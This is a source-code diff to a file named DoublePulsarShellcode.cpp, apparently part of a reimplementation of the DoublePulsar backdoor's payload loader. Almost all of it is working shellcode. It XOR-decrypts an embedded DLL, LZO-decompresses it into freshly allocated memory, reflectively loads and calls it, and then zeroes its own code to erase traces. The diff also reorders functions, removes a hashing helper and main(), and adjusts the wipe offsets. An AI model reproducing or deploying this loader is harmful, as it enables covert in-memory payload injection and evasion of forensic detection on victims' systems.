@@ -1,7 +1,7 @@
 // DoublePulsarShellcode.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
-#include <Windows.h>
+#include <windows.h>
 #include "stdio.h"
 
 #include "../Helper/Winapi.h"
@@ -15,14 +15,62 @@ lzo1z_decompress(const lzo_bytep src, lzo_uint  src_len,
     lzo_bytep dst, lzo_uintp dst_len,
     lzo_voidp wrkmem /* NOT USED */);
 
-DWORD getHash(const char* str) {
-    DWORD h = 0;
-    while (*str) {
-        h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
-        h += *str >= 'a' ? *str - 32 : *str;    // convert the character to uppercase
-        str++;
+void shellcode(HMODULE module, ushort sizeShellcode, ushort sizeDllFile, byte ordToCall);
+
+int GetDLL()
+{
+    SIZE_T start = (SIZE_T)GetDLL + SHELLCODE_XOR_OFFSET;
+
+    while (*((byte*)start) != ('M' ^ KEY_DLL) || *((byte*)start+1) != ('Z' ^ KEY_DLL))
+    {
+        *((byte*)start) ^= KEY_SHELLCODE;
+        start++;
     }
-    return h;
+
+    ushort sizeShellcode = *(ushort*)((SIZE_T)start - 11);
+    byte ordToCall = *(byte*)((SIZE_T)start - 9);
+    uint compressedSizeDllFile = *(uint*)((SIZE_T)start - 8);
+    uint sizeDllFile = *(uint*)((SIZE_T)start - 4);
+    // skip flag
+    start += 2;
+
+    byte* ptr = (byte*)start;
+    for (int i = 0; i < compressedSizeDllFile; i++, ptr++)
+    {
+        *((byte*)ptr) ^= KEY_DLL;
+    }
+
+    // Fetch WinAPI functions
+    HMODULE kernel32 = GetModuleBaseAddress(hashKERNEL32);
+    typeVirtualAlloc pVirtualAlloc = (typeVirtualAlloc)GetExportAddress(kernel32, hashVirtualAlloc);
+    //Allocate the memory
+    LPVOID unpacked_mem = pVirtualAlloc(
+        0,
+        sizeDllFile,
+        MEM_COMMIT,
+        PAGE_READWRITE);
+
+    //Unpacked data size
+    //(in fact, this variable is unnecessary)
+    lzo_uint out_len = 0;
+    
+    //Unpack with LZO algorithm
+    lzo1z_decompress(
+        (byte*)start,
+        compressedSizeDllFile,
+        (byte*)unpacked_mem,
+        &out_len,
+        0);
+
+    mmemset((void*)start, 0, compressedSizeDllFile);
+
+    // load and call the DLL
+    shellcode((HMODULE)unpacked_mem, sizeShellcode, sizeDllFile, ordToCall);
+
+    mmemset(GetModuleBaseAddress, 0, (SIZE_T)sizeShellcode - ((SIZE_T)GetModuleBaseAddress - (SIZE_T)GetDLL));
+    mmemset((void*)GetDLL, 0, (SIZE_T)GetModuleBaseAddress - (SIZE_T)GetDLL - SHELLCODE_WIPE_OFFSET);
+
+    return 0;
 }
 
 HMODULE WINAPI GetModuleBaseAddress(DWORD moduleNameHash)
@@ -412,65 +460,4 @@ void shellcode(HMODULE module, ushort sizeShellcode, ushort sizeDllFile, byte or
     pVirtualFree(imageBase, 0, MEM_RELEASE);
 
     return;
-}
-
-int GetDLL()
-{
-    SIZE_T start = (SIZE_T)GetDLL + SHELLCODE_XOR_OFFSET;
-
-    while (*((byte*)start) != ('M' ^ KEY_DLL) || *((byte*)start+1) != ('Z' ^ KEY_DLL))
-    {
-        *((byte*)start) ^= KEY_SHELLCODE;
-        start++;
-    }
-
-    ushort sizeShellcode = *(ushort*)((SIZE_T)start - 11);
-    byte ordToCall = *(byte*)((SIZE_T)start - 9);
-    uint compressedSizeDllFile = *(uint*)((SIZE_T)start - 8);
-    uint sizeDllFile = *(uint*)((SIZE_T)start - 4);
-    // skip flag
-    start += 2;
-
-    byte* ptr = (byte*)start;
-    for (int i = 0; i < compressedSizeDllFile; i++, ptr++)
-    {
-        *((byte*)ptr) ^= KEY_DLL;
-    }
-
-    // Fetch WinAPI functions
-    HMODULE kernel32 = GetModuleBaseAddress(hashKERNEL32);
-    typeVirtualAlloc pVirtualAlloc = (typeVirtualAlloc)GetExportAddress(kernel32, hashVirtualAlloc);
-    //Allocate the memory
-    LPVOID unpacked_mem = pVirtualAlloc(
-        0,
-        sizeDllFile,
-        MEM_COMMIT,
-        PAGE_READWRITE);
-
-    //Unpacked data size
-    //(in fact, this variable is unnecessary)
-    lzo_uint out_len = 0;
-    
-    //Unpack with LZO algorithm
-    lzo1z_decompress(
-        (byte*)start,
-        compressedSizeDllFile,
-        (byte*)unpacked_mem,
-        &out_len,
-        0);
-
-    mmemset((void*)start, 0, compressedSizeDllFile);
-
-    // load and call the DLL
-    shellcode((HMODULE)unpacked_mem, sizeShellcode, sizeDllFile, ordToCall);
-
-    mmemset(lzo1z_decompress, 0, (SIZE_T)sizeShellcode - ((SIZE_T)lzo1z_decompress - (SIZE_T)GetDLL));
-    mmemset((void*)GetDLL, 0, (SIZE_T)lzo1z_decompress - (SIZE_T)GetDLL - SHELLCODE_WIPE_OFFSET);
-
-    return 0;
-}
-
-int main()
-{
-    GetDLL();
 }
